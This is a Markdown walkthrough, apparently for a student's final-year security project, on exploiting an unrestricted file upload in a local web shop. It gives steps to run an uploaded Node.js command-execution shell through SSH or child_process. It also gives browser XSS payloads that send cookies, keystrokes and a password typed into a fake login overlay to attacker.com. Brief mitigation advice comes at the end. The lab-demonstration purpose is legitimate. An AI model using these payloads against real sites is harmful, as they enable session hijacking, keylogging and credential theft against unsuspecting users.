# Attack Scenario: Malicious File Upload Exploitation

## Overview
Your uploaded `shell.js` is a Node.js command execution server. This document explains how an attacker would exploit this vulnerability.

## Current Status
✅ File uploaded: `/uploads/1768490801782-shell.js`  
✅ File accessible via URL: `http://localhost:3000/uploads/1768490801782-shell.js`  
✅ Already referenced in product ID 11

---

## Attack Vector 1: Direct File Access

### Step 1: Access the Uploaded File
The attacker can directly access the uploaded JavaScript file:

```
http://localhost:3000/uploads/1768490801782-shell.js
```

**What happens:**
- Browser will download or display the file
- If loaded in a script tag, it would try to execute (but this is Node.js code, not browser JS)

### Step 2: Reference in Product Image
The attacker has already done this - product ID 11 has the shell.js as its image path.

**Attack Path:**
1. Upload malicious file → `/uploads/1768490801782-shell.js`
2. Create/edit product with image path → `/uploads/1768490801782-shell.js`
3. File is now accessible and referenced

---

## Attack Vector 2: Server-Side Execution (If Node.js Server is Running)

### Important Note
Your `shell.js` is a **Node.js server**, not browser JavaScript. To execute it:

### Option A: Run it as a separate Node.js process
```bash
# On the attacker's machine or if they have server access
node /path/to/uploads/1768490801782-shell.js
```

This would start a command execution server on port 8081.

### Option B: If attacker has server access
```bash
# SSH into server
ssh user@target-server

# Navigate to uploads
cd /path/to/public/uploads

# Execute the shell
node 1768490801782-shell.js
```

### Option C: Remote Code Execution (RCE) via other vulnerabilities
If there's an RCE vulnerability, attacker could:
```javascript
// Via SQL injection or other RCE
require('child_process').exec('node /path/to/uploads/1768490801782-shell.js');
```

---

## Attack Vector 3: Browser-Based Exploitation (XSS)

### Create a Browser-Compatible Payload
For FYP demonstration, you might want a browser-executable JavaScript payload:

**Create `xss-shell.js`:**
```javascript
// Browser-compatible XSS payload
(function() {
  // Steal cookies
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
  
  // Keylogger
  document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/keylog?key=' + e.key);
  });
  
  // Phishing overlay
  const overlay = document.createElement('div');
  overlay.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center;"><div style="background:white;padding:20px;border-radius:10px;"><h2>Session Expired</h2><p>Please login again</p><input type="password" id="pwd" placeholder="Password"><button onclick="fetch(\'http://attacker.com/phish?pwd=\'+document.getElementById(\'pwd\').value)">Login</button></div></div>';
  document.body.appendChild(overlay);
})();
```

### Upload and Reference
1. Upload `xss-shell.js`
2. Reference it in a product image
3. Load it via XSS vulnerability

---

## Attack Vector 4: Demonstrating the Vulnerability

### Scenario: Malicious File Upload + XSS

1. **Upload malicious JS file** (already done)
2. **Reference in product** (already done - product ID 11)
3. **Trigger via XSS** - If there's an XSS vulnerability that loads scripts:

```html
<!-- If XSS exists, attacker could inject: -->
<script src="/uploads/name-shell.js"></script>
```

### For Your FYP Demo:

#### Step 1: Show File Upload Vulnerability
- Upload a malicious file ✅ (Done)
- Show it's accessible via URL ✅ (Done)

#### Step 2: Show File Reference
- Reference in product image ✅ (Done - Product ID 11)

#### Step 3: Demonstrate Impact
- **Option A**: Show the file is accessible and could be executed
- **Option B**: Create a browser-compatible payload for XSS demo
- **Option C**: Show how it could be combined with other vulnerabilities

---

## Practical Demonstration Steps

### Test 1: Direct File Access
```bash
# In browser, visit:
http://localhost:3000/uploads/1768490801782-shell.js

# Or via curl:
curl http://localhost:3000/uploads/1768490801782-shell.js
```

### Test 2: Product Display
```bash
# Visit product page:
http://localhost:3000/product/11

# Check browser console - see if image fails to load
# Check Network tab - see the request to shell.js
```

### Test 3: Create Browser-Compatible Payload
Upload a new file that works in browsers:

**File: `browser-shell.js`**
```javascript
// Simple XSS payload for demonstration
alert('XSS Payload Executed!');
console.log('Malicious script loaded from:', window.location.href);
document.cookie && fetch('http://attacker.com/steal?cookie=' + document.cookie);
```

Then reference it in a product and demonstrate XSS.

---

## Security Implications for FYP

### Vulnerabilities Demonstrated:
1. ✅ **Unrestricted File Upload** - Can upload any file type
2. ✅ **Insecure File Storage** - Files stored in public directory
3. ✅ **No File Validation** - JS files allowed
4. ✅ **No Content-Type Validation** - Files served with wrong MIME type
5. ⚠️ **Potential XSS** - If JS files are loaded in script tags

### Attack Chain:
```
1. Attacker uploads malicious file
   ↓
2. File stored in public/uploads/
   ↓
3. File accessible via direct URL
   ↓
4. File referenced in product (image field)
   ↓
5. If XSS exists, file could be executed
   ↓
6. Malicious code runs in victim's browser
```

---

## Recommendations for FYP Report

### Document:
1. **Vulnerability**: Unrestricted file upload
2. **Impact**: Malicious files accessible and potentially executable
3. **Attack Vector**: Upload → Reference → Execute
4. **Mitigation**: 
   - Validate file types
   - Store files outside public directory
   - Use proper MIME types
   - Sanitize filenames
   - Implement Content Security Policy (CSP)

---

## Quick Test Commands

### Check if file is accessible:
```bash
curl http://localhost:3000/uploads/1768490801782-shell.js
```

### Check product with malicious file:
```bash
curl http://localhost:3000/api/products | grep "1768490801782"
```

### Test in browser:
1. Visit: `http://localhost:3000/product/11`
2. Open DevTools → Network tab
3. See request to `shell.js`
4. Check if it's loaded as image (will fail) or script

---

## Next Steps for Full Demonstration

1. **Create browser-compatible payload** (XSS shell)
2. **Upload it** via admin panel
3. **Reference in product**
4. **Demonstrate XSS execution** (if XSS vulnerability exists)
5. **Show impact**: Cookie theft, keylogging, etc.
